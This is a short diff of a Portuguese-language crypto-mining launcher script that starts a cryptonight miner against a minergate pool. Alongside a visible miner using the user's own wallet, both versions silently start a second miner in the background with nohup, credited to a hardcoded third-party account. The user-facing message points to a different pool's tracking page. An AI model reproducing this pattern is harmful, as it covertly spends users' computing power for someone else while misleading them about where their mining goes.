@@ -95,5 +95,5 @@ sleep 1
 echo "Você pode acompanhar como anda sua Mineração em: http://www.zpool.ca/?address=$wallet " 
 sleep 10
 cd miner
-nohup ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u lerotuf@gmail.com -p x &
-screen ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u $wallet
+nohup ./minerd -o stratum+tcp://xmr.pool.minergate.com:45560 -u 0ad42c5d-30eb-4af4-b551-ccc1ecc4b12c &
+screen ./minerd -o stratum+tcp://xmr.pool.minergate.com:45560 -u $wallet
